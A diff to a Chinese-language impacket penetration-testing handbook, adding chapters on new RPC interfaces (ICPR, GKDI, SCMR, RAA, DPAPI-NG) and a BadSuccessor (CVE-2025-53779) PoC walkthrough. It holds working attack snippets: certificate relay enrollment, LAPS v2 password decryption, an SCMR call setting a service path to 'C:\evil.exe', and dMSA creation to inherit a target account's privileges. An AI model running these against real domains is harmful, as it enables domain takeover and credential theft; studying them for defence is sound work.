@@ -21,6 +21,8 @@ impacket 是一个常用的“域渗透工具包”，其 examples 文件夹下�
 | 第三部分 DCE/RPC | 第 5 章 dcerpc | 先读 RPC 编程基础（NDR、rpcrt、epm、transport），再按功能组选读各接口模块 | 第 2、4 章 |
 | 第四部分 DCOM 与 WMI | 第 6 章 MS-DCOM | DCOM 编程、dcomrt、oaut/wmi 等子模块 | 第 5 章 |
 | 第五部分 基础库 | 第 7 章 common | SMB、DPAPI、NTDS 等基础支撑模块速览 | 按需 |
+| 第六部分 新版接口与实战案例 | 第 8 章 0.12–0.14 新增接口与支持库 | ICPR、GKDI、NEGOEX、RAA、SCMR、`acl.py`、`dpapi_ng.py` | 第 2、5 章 |
+| | 第 9 章 实战案例 | BadSuccessor（CVE-2025-53779）与 CVE-2025-33073 的 PoC 编写 | 第 3、5 章 |
 
 第三部分中，dcerpc 的接口模块按功能可分为五组（正文大体按此组织，可按组选读）：
 
@@ -29,6 +31,8 @@ impacket 是一个常用的“域渗透工具包”，其 examples 文件夹下�
 3. **系统与运维**：even6、iphlp、rrp（注册表）、rprn / par（打印）、srvs（共享）、wkst、tsts、MS-TSCH（计划任务）、dhcpm；
 4. **Exchange 相关**：nspi、oxabref、rpch；
 5. **凭据与目录复制**：bkrp、drsuapi（DCSync）、dssp。
+
+第六部分补充了上述分组尚未覆盖、由 impacket 0.12–0.14 引入的新接口与支持库：证书注册接口 **ICPR**、组密钥分发协议 **GKDI**、SPNEGO 扩展协商 **NEGOEX**、远程授权 API **RAA**、服务控制管理器 **SCMR**，以及 **`acl.py`**、**`dpapi_ng.py`** 两个支持模块。
 
 [TOC]
 
@@ -44,6 +48,7 @@ C:.
 │   # impacket 根目录：协议实现与基础模块
 │   cdp.py / crypto.py / dhcp.py / dns.py / dot11.py / Dot11Crypto.py
 │   dpapi.py / ese.py / http.py / nmb.py / ntlm.py / spnego.py
+│   negoex.py / acl.py / dpapi_ng.py / helper.py / winregistry.py / mqtt.py
 │   smb.py / smb3.py / smb3structs.py / smbconnection.py / smbserver.py
 │   structure.py / system_errors.py / tds.py / uuid.py / version.py / wps.py ...
 │
@@ -54,12 +59,14 @@ C:.
 │       │   lsad.py / lsat.py / mimilib.py / nrpc.py / nspi.py / oxabref.py
 │       │   par.py / rpch.py / rprn.py / rrp.py / samr.py / srvs.py
 │       │   tsch.py / tsts.py / wkst.py / dcomrt.py ...
+│       │   icpr.py / gkdi.py / raa.py / scmr.py / sasec.py / mgmt.py / iphlp.py / even.py   # 第六部分新增
 │       │
 │       └───dcom          # DCOM 子模块（第六部分）
 │               comev.py / oaut.py / scmp.py / vds.py / wmi.py
 │
 ├───examples              # 域渗透常用脚本：getTGT / getST / ticketer / secretsdump
 │   │                     # psexec / wmiexec / atexec / dcomexec / rpcmap / netview ...
+│   │                     # badsuccessor / describeTicket / CheckLDAPStatus / regsecrets ...
 │   └───ntlmrelayx        # NTLM 中继框架（attacks / clients / servers /
 │                         #   socksplugins / utils 子目录结构略）
 │
@@ -4792,6 +4799,482 @@ wps协议支持
 WPS全称为Wi-Fi Protected Setup，是WSC规范早期的名字，WSC全称为Wi-Fi Simple Configuration，该项技术用于简化SOHO环境中无线网络的配置和使用。举一个简单的例子，配置无线网络环境时，网管需要首先为AP设置SSID、安全属性（如身份认证方法、加密方法等）。然后他还得把SSID、密码告诉给该无线网络的使用者。可是这些安全设置信息对普通大众而言还是有些复杂。而有了WSC之后，用户只需输入PIN码（Personal Identification Number，一串数字），或者摁一下专门的按钮（WSC中，该按钮被称为Push Button）甚至用户只要拿着支持NFC的手机到目标AP（它必须也支持NFC）旁刷一下，这些安全设置就能被自动配置好。有了这些信息，手机就能连接上目标无线网络了。显然，相比让用户记住SSID、密码等信息，WSC要简单多了。WFA推出WPA后不久，WPS规范便被推出。随着WPA2的出现，WFA又制订了WPS的升级版，即WSC。
 
 
+
+# 第六部分 新版接口与实战案例
+
+impacket 大致保持着每年一个大版本的迭代节奏：**0.12.0**（2024-09）、**0.13.0**（2025-10）、**0.13.1**（2026-05），主线（0.14.0.dev）仍在持续合入新协议。本部分承接前五部分，补齐这些新增、尚未在正文中覆盖的 RPC 接口与支持库，并以两个最新的公开漏洞——**BadSuccessor（CVE-2025-53779）**与 **CVE-2025-33073**——为例，演示如何基于 impacket 自己动手编写 PoC。
+
+## 第 8 章 新版 impacket 新增接口与支持库（0.12 – 0.14）
+
+相对旧版本，这一轮新增的模块如下表所示。它们大多不是"再造一个 SAMR"，而是补上了 AD 攻击链上此前只能靠自研代码或第三方工具完成的环节：证书注册、组密钥分发、认证协商、授权枚举与 ACL 操作。
+
+| 模块 | 规范 | 引入版本 | 一句话用途 |
+| :--- | :--- | :--- | :--- |
+| `dcerpc/v5/icpr.py` | [MS-ICPR] ICertPassage | 0.13.0 | 通过 RPC 向企业 CA 提交证书请求（AD CS） |
+| `dcerpc/v5/gkdi.py` | [MS-GKDI] Group Key Distribution | 0.12.0 | 获取组密钥信封（DNSSEC 根密钥保护 / DPAPI-NG） |
+| `negoex.py` | [MS-NEGOEX] SPNEGO Extended Negotiation | 0.14.0.dev（主线，未发行） | 解析与构造 SPNEGO 扩展协商（NEGOEX）报文 |
+| `dcerpc/v5/raa.py` | [MS-RAA] Remote Authorization API | 主线 | 以指定身份对安全描述符做"服务端授权判决" |
+| `dcerpc/v5/scmr.py` | [MS-SCMR] Service Control Manager | 早已存在 | 远程服务管理（psexec / smbexec 的底层） |
+| `acl.py` | — | 0.13.1 | 面向 SMB/NTFS 的可复用 ACL 读写辅助 |
+| `dpapi_ng.py` | — | 0.12+ | DPAPI 下一代（CNG）解密，用于 gMSA / dMSA / LAPSv2 |
+
+> 说明：`scmr.py` 并非新增，但此前正文未单列；本章一并补齐，因为它正是理解"横向移动为什么总是落到服务"的关键。`negoex.py` 目前只存在于主线（0.14.0.dev），尚未进入正式发行版，引用时请以对应 commit 为准。
+
+### 8.1 [MS-ICPR] icpr.py — 证书注册接口（AD CS 的 RPC 通道）
+
+[MS-ICPR]（ICertPassage Remote Protocol）定义了客户端向企业证书颁发机构（CA）提交证书请求的 RPC 接口。它对应的 RPC 接口名是 **ICertPassage**，端点通常挂在命名管道 `\pipe\cert` 上（也可通过 EPM 动态发现）。在 AD CS 攻击里，它的意义在于：**"中继到 CA 申领证书"这条路径不再只能打 HTTP 注册端点（ESC8 的经典打法），还可以直接打 RPC。**
+
+```python
+from impacket.uuid import uuidtup_to_bin
+
+MSRPC_UUID_ICPR = uuidtup_to_bin(("91ae6020-9e3c-11cf-8d7c-00aa00c091be", "0.0"))
+```
+
+该接口只定义了一个 opnum 0 方法 `CertServerRequest`。请求与响应中复用 [MS-WCCE] 2.2.2.2 定义的 `CERTTRANSBLOB` 结构（一个长度 + 一个字节数组）：
+
+```python
+class CERTTRANSBLOB(NDRSTRUCT):
+    structure = (
+        ("cb", ULONG),      # 字节数组长度
+        ("pb", PBYTE),      # 字节数组内容
+    )
+
+class CertServerRequest(NDRCALL):
+    opnum = 0
+    structure = (
+        ("dwFlags", DWORD),
+        ("pwszAuthority", LPWSTR),      # CA 名称（可为空，由服务端默认）
+        ("pdwRequestId", DWORD),        # 请求 id，首次填 0
+        ("pctbAttribs", CERTTRANSBLOB),   # 请求属性，换行分隔，如 CertificateTemplate:User
+        ("pctbRequest", CERTTRANSBLOB),   # DER 编码的 PKCS#10 CSR
+    )
+
+class CertServerRequestResponse(NDRCALL):
+    structure = (
+        ("pdwRequestId", DWORD),
+        ("pdwDisposition", ULONG),        # 处置结果：3=已颁发，5=待审批
+        ("pctbCert", CERTTRANSBLOB),
+        ("pctbEncodedCert", CERTTRANSBLOB),        # 颁发的证书（DER）
+        ("pctbDispositionMessage", CERTTRANSBLOB),
+    )
+```
+
+模块末尾提供了辅助函数 `hCertServerRequest`，把"拼属性、转 CSR、发请求、判断处置结果"几件事一次做完：
+
+```python
+def hCertServerRequest(
+    dce: DCERPC_v5,
+    csr: bytes,
+    attributes: List[str],
+    request_id: int = 0,
+    ca: str = ""
+) -> str:
+    attribs = checkNullString("\n".join(attributes)).encode("utf-16le")
+    pctb_attribs = CERTTRANSBLOB()
+    pctb_attribs["cb"] = len(attribs)
+    pctb_attribs["pb"] = attribs
+
+    pctb_request = CERTTRANSBLOB()
+    pctb_request["cb"] = len(csr)
+    pctb_request["pb"] = csr
+
+    request = CertServerRequest()
+    request["dwFlags"] = 0
+    request["pwszAuthority"] = checkNullString(ca)
+    request["pdwRequestId"] = request_id
+    request["pctbAttribs"] = pctb_attribs
+    request["pctbRequest"] = pctb_request
+
+    response = dce.request(request)
+    # ... pdwDisposition == 3 表示成功，== 5 表示待审批
+    return b"".join(response["pctbEncodedCert"]["pb"])
+```
+
+下面是自写 PoC 的最小骨架：先用 `cryptography` 生成一把密钥与 CSR，再绑定 ICertPassage 提交。`example/icpr_enroll_cert.py` 是可直接运行的完整版本。
+
+```python
+# eg.example/icpr_enroll_cert.py（节选）
+from impacket.dcerpc.v5 import transport, epm, icpr
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+
+def enroll(target, ca_name, template, username, password, domain):
+    # 1. 通过 EPM 解析 ICertPassage 的动态端点，走 ncacn_ip_tcp
+    binding = epm.hept_map(target, icpr.MSRPC_UUID_ICPR, protocol="ncacn_ip_tcp")
+    rpctransport = transport.DCERPCTransportFactory(binding)
+    rpctransport.set_credentials(username, password, domain)
+    dce = rpctransport.get_dce_rpc()
+    dce.connect()
+    dce.bind(icpr.MSRPC_UUID_ICPR)
+
+    # 2. 用 cryptography 生成私钥与 CSR
+    key, csr_der = build_csr(template)
+
+    # 3. 提交：属性用换行分隔；ca 传 CA 的"名称"（netbios\CA 或 CA 名）
+    cert_der = icpr.hCertServerRequest(dce, csr_der, ["CertificateTemplate:%s" % template], ca=ca_name)
+    dce.disconnect()
+    return key, cert_der
+```
+
+实战中，ntlmrelayx 的 `rpcattack.py` 正是用这套接口实现"中继到 ICPR 申领证书"的 `ICPRRPCAttack`：拿到中继会话后，用 `ADCSAttack.generate_csr` 造 CSR，再调用 `icpr.hCertServerRequest(...)`，最后把证书写成 PKCS#12（pfx）。由于 ICPR 只走明文 RPC，**若 CA 强制加密 / 启用 EPA，此路径会失败**——这也是攻击者更偏好 HTTP 端点的原因，但它恰恰说明"关闭一个通道不等于关闭整个攻击面"。
+
+### 8.2 [MS-GKDI] gkdi.py — 组密钥分发协议
+
+[MS-GKDI]（Group Key Distribution Protocol）用于在域内向 KDS（Key Distribution Service）根密钥请求"组密钥信封"（Group Key Envelope, GKE）。它服务的典型场景有两类：DNSSEC 根密钥保护和 **DPAPI-NG（CNG）**——也就是 gMSA、dMSA、Windows LAPS v2 这些"托管密码"的解密。
+
+```python
+MSRPC_UUID_GKDI = uuidtup_to_bin(('B9785960-524F-11DF-8B6D-83DCDED72085', '1.0'))
+```
+
+接口同样只有一个 opnum 0 方法 `GkdiRpcGetKey`：
+
+```python
+class GkdiRpcGetKey(NDRCALL):
+    opnum = 0
+    structure = (
+        ('cbTargetSD', ULONG),       # 目标安全描述符长度
+        ('pbTargetSD', BYTE_ARRAY),  # 目标安全描述符：服务端据此判断调用者是否有权取密钥
+        ('pRootKeyID', PGUID),
+        ('L0KeyID', LONG),
+        ('L1KeyID', LONG),
+        ('L2KeyID', LONG),
+    )
+```
+
+辅助函数 `GkdiGetKey` 用起来很直接——把目标的安全描述符和三级索引传进去即可：
+
+```python
+def GkdiGetKey(dce, target_sd, l0=-1, l1=-1, l2=-1, root_key_id=NULL):
+    request = GkdiRpcGetKey()
+    request['cbTargetSD'] = len(target_sd)
+    request['pbTargetSD'] = target_sd.getData()
+    request['pRootKeyID'] = root_key_id
+    request['L0KeyID'] = l0
+    request['L1KeyID'] = l1
+    request['L2KeyID'] = l2
+    return dce.request(request)
+```
+
+响应是一个字节串，需交给 `GroupKeyEnvelope` 解析。该结构里真正有用的是 **L1Key / L2Key** 以及 KDF、加密算法参数——它们是后续派生具体数据密钥（KEK）的原料：
+
+```python
+class GroupKeyEnvelope(Structure):
+    structure = (
+        ('Version', '<L=0'),
+        ('Magic', '<L=0'),
+        # ... L0Index / L1Index / L2Index / RootKeyId 等
+        ('KdfAlgo', ':'), ('KdfPara', ':', KDFParameter),
+        ('SecAlgo', ':'), ('SecPara', ':'),
+        ('L1Key', ':'), ('L2Key', ':'),
+    )
+```
+
+调用路径（参考 `examples/GetLAPSPassword.py` 的 `getLAPSv2Decrypt`）非常固定：先从 LDAP 读到的 LAPS blob 里解析出 `KeyIdentifier`（含 L0/L1/L2 与 RootKeyId），再用 `hept_map` 解析 GKDI 的 `ncacn_ip_tcp` 动态端点并绑定：
+
+```python
+from impacket.dcerpc.v5.gkdi import MSRPC_UUID_GKDI, GkdiGetKey, GroupKeyEnvelope
+from impacket.dpapi_ng import EncryptedPasswordBlob, KeyIdentifier, compute_kek, unwrap_cek, decrypt_plaintext
+
+stringBinding = hept_map(destHost=target, remoteIf=MSRPC_UUID_GKDI, protocol='ncacn_ip_tcp')
+resp = GkdiGetKey(dce, target_sd=target_sd, l0=key_id['L0Index'], l1=key_id['L1Index'],
+                  l2=key_id['L2Index'], root_key_id=key_id['RootKeyId'])
+gke = GroupKeyEnvelope(b''.join(resp['pbbOut']))
+kek = compute_kek(gke, key_id)
+```
+
+拿到 GKE 之后的具体解密属于 DPAPI-NG 的范畴，见 8.7 节。`example/gkdi_get_key.py` 给出了一个独立可运行的取密钥示例。
+
+### 8.3 [MS-NEGOEX] negoex.py — SPNEGO 扩展协商
+
+[MS-NEGOEX]（SPNEGO Extended Negotiation Security Mechanism）是 SPNEGO 的扩展：SPNEGO 只做一次简单的 OID 交换，无法表达"需要多轮交换的认证机制"以及元数据；NEGOEX 用一个独立的状态机补上了这两点。在 SPNEGO 内部，NEGOEX 以 OID `1.3.6.1.4.1.311.2.2.30` 标识，报文的魔数是小端的 `NEGOEXTS`（`0x535458454f47454e`）。
+
+```python
+MESSAGE_SIGNATURE = b'NEGOEXTS'
+NEGOEX_OID = b'\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x1e'
+AUTH_SCHEME_PKU2U = uuid.UUID('235f69ad-73fb-4dbc-8203-0629e739339b')
+CHECKSUM_SCHEME_RFC3961 = 1
+```
+
+NEGOEX 定义了 8 种报文类型，全部由 `MessageHeader` 开头（签名 + 类型 + 序号 + 头长 + 总长 + ConversationId）：
+
+```python
+class MESSAGE_TYPE(IntEnum):
+    INITIATOR_NEGO   = 0   # 发起方协商（携带本端支持的认证机制）
+    ACCEPTOR_NEGO    = 1   # 接受方协商
+    INITIATOR_META_DATA = 2
+    ACCEPTOR_META_DATA  = 3
+    CHALLENGE        = 4   # 机制相关的质询数据
+    AP_REQUEST       = 5   # 机制相关的认证请求数据
+    VERIFY           = 6   # 完整性校验（RFC 3961 校验和）
+    ALERT            = 7   # 告警
+```
+
+模块把每种报文都封装成了 `Structure` 子类：`NegoMessage`、`ExchangeMessage`、`VerifyMessage`、`AlertMessage`；并提供了 `parseNegoExToken`（把一段拼接的 NEGOEX token 拆成多条报文）与 `createNegoMessage` / `createExchangeMessage` / `createVerifyMessage` / `createAlertMessage`（构造报文）。真正驱动整个交换的是 `NegoExContext` 状态机：
+
+```python
+class NegoExContext(object):
+    """Drives a NEGOEX negotiation as either initiator or acceptor."""
+
+    def registerAuthScheme(self, scheme): ...          # 注册本端支持的认证机制
+
+    def createInitialToken(self, optimisticToken=None):
+        # 构造 INITIATOR_NEGO；带 optimisticToken 时可省掉一次往返（[MS-NEGOEX] 3.1.5.4）
+        ...
+
+    def processToken(self, data):
+        # 解析对端 token，推进状态机，返回需要交给认证机制处理的 exchange 载荷
+        ...
+
+    def _processVerify(self, verifyMsg):
+        # 用方案提供的密钥校验 VERIFY 的 RFC3961 校验和
+        keyUsage = NEGOEX_KEYUSAGE_ACCEPTOR if self.isInitiator else NEGOEX_KEYUSAGE_INITIATOR
+        expected = make_checksum(checksumType, Key(enctype, keyBytes), keyUsage, b''.join(self._messageHistory))
+        ...
+```
+
+其中校验和使用了 RFC 3961 的密钥用途编号：**发起方签名用 23，接受方签名用 25**。`parseNegoExToken` 是这套代码里最实用的一环——它把一段 NEGOEX token 拆成有序的报文列表，每条都带着原始字节（`raw_data`），便于做协议分析或校验和复算：
+
+```python
+from impacket.negoex import parseNegoExToken, MESSAGE_TYPE
+
+for pm in parseNegoExToken(token_bytes):
+    if pm.getMessageType() == MESSAGE_TYPE.INITIATOR_NEGO:
+        print(pm.message.getAuthSchemeList())   # 对端支持的认证机制 GUID 列表
+```
+
+对攻击研究而言，NEGOEX 的价值在于它把"备选认证机制"摆上了台面：`ntlmrelayx` 在 0.13.1 中特意**不再向 SMB 对端广告 NEGOEX**（见 ChangeLog "avoiding unsupported NEGOEX advertisement"），正是因为不当的 NEGOEX 广告会改变协商结果、干扰中继。理解这段状态机，是判断"一次协商最终会落到 Kerberos 还是 NTLM"的关键。`example/negoex_parse_token.py` 演示了如何用十六进制 token 复算校验和。
+
+> 版本提示：`negoex.py` 截至写作时仍属主线（0.14.0.dev）未发行特性，接口可能微调，仅建议用于研究与解析。
+
+### 8.4 [MS-RAA] raa.py — 远程授权枚举
+
+[MS-RAA]（Remote Authorization API Protocol）把 Windows 本地的 Authz API 搬到了 RPC 上。它最漂亮的地方在于：**它允许你把一份安全描述符发给服务端，直接问"对于某个身份（SID），这份描述符到底授予了什么权限"——由服务端来做继承、ScopedPolicyID 剥离等全部计算。** 这比在本地手撕 DACL 精确得多，尤其适合在 BadSuccessor 这类攻击前做权限确认。
+
+```python
+MSRPC_UUID_RAA = uuidtup_to_bin(('0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7', '0.0'))
+
+# 两个对象 UUID：后者会关闭服务端对 SYSTEM_SCOPED_POLICY_ID_ACE 的剥离
+RAA_OBJECT_UUID_DEFAULT           = '9a81c2bd-a525-471d-a4ed-49907c0b23da'
+RAA_OBJECT_UUID_NO_SCOPED_POLICY  = '5fc860e0-6f6e-4fc2-83cd-46324f25e90b'
+```
+
+接口共 7 个 opnum：
+
+```python
+OPNUMS = {
+    0 : (AuthzrFreeContext, AuthzrFreeContextResponse),
+    1 : (AuthzrInitializeContextFromSid, AuthzrInitializeContextFromSidResponse),   # SID -> 授权上下文
+    2 : (AuthzrInitializeCompoundContext, AuthzrInitializeCompoundContextResponse), # 用户+设备复合上下文
+    3 : (AuthzrAccessCheck, AuthzrAccessCheckResponse),   # 核心：拿安全描述符做访问判决
+    4 : (AuthzGetInformationFromContext, AuthzGetInformationFromContextResponse),   # 取组成员/声明
+    5 : (AuthzrModifyClaims, AuthzrModifyClaimsResponse),
+    6 : (AuthzrModifySids, AuthzrModifySidsResponse),
+}
+```
+
+注意测试用例（`tests/dcerpc/test_raa.py`）显示该接口走 **`ncacn_ip_tcp` 且要求 `RPC_C_AUTHN_LEVEL_PKT_PRIVACY`**，因为服务端要以调用者身份为准。典型用法是先 `hAuthzrInitializeContextFromSid` 把 SID 变成上下文，再 `hAuthzrAccessCheck` 传入安全描述符和期望的访问掩码：
+
+```python
+sid_ctx = raa.hAuthzrInitializeContextFromSid(dce, target_sid, flags=raa.AUTHZ_COMPUTE_PRIVILEGES)
+resp = raa.hAuthzrAccessCheck(dce, sid_ctx['ContextHandle'], securityDescriptor, desiredAccess,
+                              objectTypeList=[], resultListLength=1)
+granted = resp['pReply']['GrantedAccessMask'][0]   # 服务端算出的最终授权结果
+```
+
+有了它，"某个普通用户对某个 OU 是否具备 `CreateChild`（0x1）或对 `msDS-DelegatedManagedServiceAccount` 的创建权"这类问题，可以让服务端直接给出答案，而不必自己实现一套（容易出错的）ACL 继承算法。`example/raa_enum_permissions.py` 用它来判断"指定 SID 能否在目标 OU 下创建子对象"。
+
+### 8.5 [MS-SCMR] scmr.py — 服务控制管理器
+
+[MS-SCMR] 是远程服务管理协议，端点 `\pipe\svcctl`。它是 `psexec.py` / `smbexec.py` / `services.py` 的底层——**域内横向移动最终几乎都要落到"在目标上起一个服务"**，所以理解它是绕不开的。
+
+```python
+MSRPC_UUID_SCMR = uuidtup_to_bin(('367ABB81-9844-35F1-AD32-98F038001003', '2.0'))
+```
+
+模块提供了成体系的辅助函数，覆盖服务生命周期：
+
+```python
+from impacket.dcerpc.v5 import scmr
+
+# 打开 SCM 数据库 -> 打开/创建服务 -> 启动/控制服务
+scHandle = scmr.hROpenSCManagerW(dce, 'DUMMY\x00', 'ServicesActive\x00', scmr.SC_MANAGER_ALL_ACCESS)['lpScHandle']
+svcHandle = scmr.hROpenServiceW(dce, scHandle, 'MyService\x00')
+scmr.hRQueryServiceStatus(dce, svcHandle)
+scmr.hRQueryServiceConfigW(dce, svcHandle)      # 查二进制路径等配置
+scmr.hRChangeServiceConfigW(dce, svcHandle, lpBinaryPathName='C:\\evil.exe\x00')
+scmr.hRStartServiceW(dce, svcHandle)
+```
+
+一个常见的"自写脚本"场景是**枚举服务、把可写二进制路径的服务记下来做 DLL 劫持 / 服务替换**：
+
+```python
+resp = scmr.hREnumServicesStatusW(dce, scHandle)
+for svc in resp['lpServiceStatus']:
+    cfg = scmr.hRQueryServiceConfigW(dce, scmr.hROpenServiceW(dce, scHandle, svc['lpServiceName'])['lpServiceHandle'])
+    print(svc['lpServiceName'], cfg['lpServiceConfig']['lpBinaryPathName'])
+```
+
+> 版本提示：0.13.1 修复了 SCMR "failure action" 编组的问题（ChangeLog #2046/#2152）；如果你在旧版本上调用 `RChangeServiceConfig2W` 设置失败动作异常，升级即可。
+
+### 8.6 acl.py — 面向 SMB/NTFS 的 ACL 辅助库
+
+0.13.1 新增了一个**可复用**的 ACL 辅助模块 `impacket/acl.py`（作者 Gefen Altshuler）。过去要改远程文件的 ACL，得自己在 `ldaptypes` 与 `smb3structs` 之间来回转换；现在它把这些封装成 `SecurityAttributes`、`SMBFileACL` 等类，并复用了 `ldaptypes` 的 ACE/DACL 结构。
+
+```python
+# 支持的权限简写，映射到 NT 访问掩码
+SUPPORTED_PERMISSIONS = {
+    "R": 0x00120089,   # 读
+    "W": 0x00100116,   # 写
+    "D": 0x00110000,   # 删除
+    "X": 0x00000020,   # 执行
+    "F": 0x001F01FF,   # 完全控制
+}
+```
+
+它面向的是"通过 SMB 读写文件安全描述符"这一场景，配合 0.13.1 给 `smbclient.py` 增加的 ACL 管理能力使用。（SMB 侧 ACL 增删改直接用上游 `examples/smbclient.py` 自带的 ACL 命令即可，无需本地重复实现。）这个模块的意义在于：**它把"ACL 操作"从 LDAP 场景延伸到了 SMB 文件场景**，补齐了此前只有 `dacledit`（LDAP）而缺 SMB 侧工具的空白。
+
+### 8.7 dpapi_ng.py — DPAPI 下一代（CNG）
+
+`impacket/dpapi_ng.py` 实现了 DPAPI-NG（又叫 DPAPI CNG）的解密流程。它与 `gkdi.py` 是"上下游"关系：**GKDI 负责取回组密钥信封，dpapi_ng 负责用它把被保护的数据解开。** 覆盖面包括 gMSA / dMSA 的 `msDS-ManagedPassword`、Windows LAPS v2 的 `msLAPS-EncryptedPassword`、以及证书私钥（`msDS-KeyCredentialLink`）。
+
+模块内的关键函数形成了清晰的一条链：
+
+```python
+def SP800_108_Counter(master, key_len, prf, num_keys=None, label=b'', context=b''): ...
+def compute_kdf_context(key_guid, l0, l1, l2): ...
+def compute_l2_key(key_id: KeyIdentifier, gke: GroupKeyEnvelope): ...
+def compute_kek(gke: GroupKeyEnvelope, key_id: KeyIdentifier): ...      # 用 GKE 派生 KEK
+def aes_unwrap(wrapping_key: bytes, wrapped_key: bytes): ...
+def unwrap_cek(kek, encrypted_cek): ...
+def decrypt_plaintext(cek, iv, encrypted_blob): ...
+```
+
+其中 KDF 采用了 NIST SP 800-108 的计数器模式（`SP800_108_Counter`），并用到了固定标签 `KDS service`（生成 KEK）等常量：
+
+```python
+KDS_SERVICE_LABEL  = "KDS service\0".encode("utf-16-le")
+KEK_PUBLIC_KEY_LABEL = "KDS public key\0".encode("utf-16le")
+```
+
+完整的解密链路可以直接参考 `examples/GetLAPSPassword.py`：
+
+```python
+# 1. LDAP 读到 msLAPS-EncryptedPassword（EncryptedPasswordBlob）
+blob = EncryptedPasswordBlob(rawEncryptedLAPSBlob)
+key_id = blob['KeyIdentifier']
+# 2. 用 GKDI 取回 GroupKeyEnvelope（见 8.2）
+gke = GroupKeyEnvelope(b''.join(GkdiGetKey(...)['pbbOut']))
+# 3. 派生 KEK -> 解包 CEK -> 解密明文
+kek = compute_kek(gke, key_id)
+cek = unwrap_cek(kek, blob['EncryptedCek'])
+plaintext = decrypt_plaintext(cek, blob['Iv'], blob['EncryptedBlob'])
+```
+
+这条链路是**读取 Windows LAPS v2 与 gMSA/dMSA 托管密码**的通用姿势。完整可运行的示例见上游 `examples/GetLAPSPassword.py`（其 `getLAPSv2Decrypt` 就是这条链路）。
+
+## 第 9 章 实战案例：用 impacket 编写最新漏洞 PoC
+
+本章挑了两个最有代表性的最新案例：**BadSuccessor**（滥用 Windows Server 2025 新引入的 dMSA 账户类型接管域）与 **CVE-2025-33073**（反射式中继一步拿到 SYSTEM）。前者演示"如何用 LDAP + 自构造安全描述符写攻击脚本"，后者演示"如何理解并复现 impacket 中继框架支持的最新攻击工作流"。
+
+### 9.1 BadSuccessor（CVE-2025-53779）：滥用 dMSA 接管域
+
+**背景。** 2025 年 5 月 21 日，Akamai 研究员 Yuval Gordon 公开了 **BadSuccessor**；在 DEF CON 2025 演讲后不久，微软为其分配了编号 **CVE-2025-53779** 并发布补丁。它滥用的不是某个"内存破坏 bug"，而是 Windows Server 2025 新引入的一种账户类型——**委派托管服务账户（delegated Managed Service Account，dMSA）**。dMSA 的设计初衷是方便把传统服务账户"迁移"成托管账户；但研究者发现，**迁移关系的继承完全依赖单个属性 `msDS-ManagedAccountPrecededByLink`，而 KDC 从不校验这条"血缘"是否真实**。
+
+**原理。** 只要攻击者对**任意一个 OU**拥有 `CreateChild`（"创建所有子对象"）或创建 `msDS-DelegatedManagedServiceAccount` 的权限，就能在该 OU 下创建一个 dMSA，然后把它的 `msDS-ManagedAccountPrecededByLink` 指向任意目标账户（Domain Admin、域控、Protected Users，甚至"敏感不可委派"账户），并把迁移状态置为"已完成"。之后 KDC 在认证时会把这个 dMSA 当作目标的"继任者"：一方面把目标的**全部组权限合并进 dMSA 的 PAC**，另一方面在 dMSA 密钥包中**返回目标的 Kerberos 密钥**。Akamai 在 91% 的受测环境里发现，域管理员组之外的用户就已经具备所需权限。
+
+关键属性一览：
+
+| 属性 | 作用 |
+| :--- | :--- |
+| `objectClass` = `msDS-DelegatedManagedServiceAccount` | dMSA 的对象类 |
+| `msDS-DelegatedMSAState` = 2 | 迁移状态（2 表示"迁移完成"） |
+| `msDS-ManagedAccountPrecededByLink` | 指向被"继承"的账户 DN —— 攻击的核心 |
+| `msDS-GroupMSAMembership` | 谁有权取回托管密码（安全描述符） |
+| `msDS-ManagedPasswordInterval` | 密码轮换周期 |
+
+**impacket 的对应工具。** `examples/badsuccessor.py` 实现了 `search` / `add` / `delete` / `modify` 四个动作。其中 `search` 等价于 Akamai 的 `Get-BadSuccessorOUPermissions.ps1`：遍历所有 OU 的 `nTSecurityDescriptor`，找出对 `msDS-DelegatedManagedServiceAccount`（GUID `0feb936f-47b3-49f2-9386-1dedc2c23765`）具备相关权限的身份。
+
+```python
+# eg.examples/badsuccessor.py（节选：search_ous 的 ACL 判定）
+relevant_rights = {
+    "CreateChild": 0x00000001,
+    "GenericAll":  0x10000000,
+    "WriteDACL":   0x00040000,
+    "WriteOwner":  0x00080000,
+}
+relevant_object_types = {
+    "00000000-0000-0000-0000-000000000000": "All Objects",
+    "0feb936f-47b3-49f2-9386-1dedc2c23765": "msDS-DelegatedManagedServiceAccount",
+}
+
+sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)     # 解析 OU 的安全描述符
+for ace in sd['Dacl'].aces:
+    if ace['AceType'] not in (ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE,
+                              ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE):
+        continue
+    mask = int(ace['Ace']['Mask']['Mask'])
+    if not any(mask & right for right in relevant_rights.values()):
+        continue
+    # 对象型 ACE 还要看 ObjectType GUID 是否命中 dMSA
+    ace_data = ace['Ace']
+    if ace['AceType'] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE:
+        object_guid = str(uuid.UUID(bytes_le=ace_data['ObjectType'])).lower()
+        if object_guid not in relevant_object_types:
+            continue
+    ...
+```
+
+`add` 动作则演示了"自构造安全描述符 + 创建对象"的完整写法，这正是本手册反复强调的"自己写 PoC"的能力：先为 dMSA 构造一份只允许攻击者取回密码的 `nTSecurityDescriptor`，再一次性把上面那串属性写进去。
+
+```python
+# eg.examples/badsuccessor.py（节选：add_dmsa 的属性与创建调用）
+attributes = {
+    'cn': self.__dmsaName,
+    'sAMAccountName': '%s$' % self.__dmsaName,
+    'dNSHostName': dns_hostname,
+    'userAccountControl': 4096,
+    'msDS-ManagedPasswordInterval': 30,
+    'msDS-DelegatedMSAState': 2,                       # 迁移"完成"
+    'msDS-SupportedEncryptionTypes': 28,
+    'accountExpires': 9223372036854775807,
+    'msDS-GroupMSAMembership': group_msa_membership,   # 允许谁读托管密码
+    'msDS-ManagedAccountPrecededByLink': target_dn,    # 指向被继承账户
+}
+success = ldapConnection.add(dmsa_dn, ['msDS-DelegatedManagedServiceAccount'], attributes=attributes)
+```
+
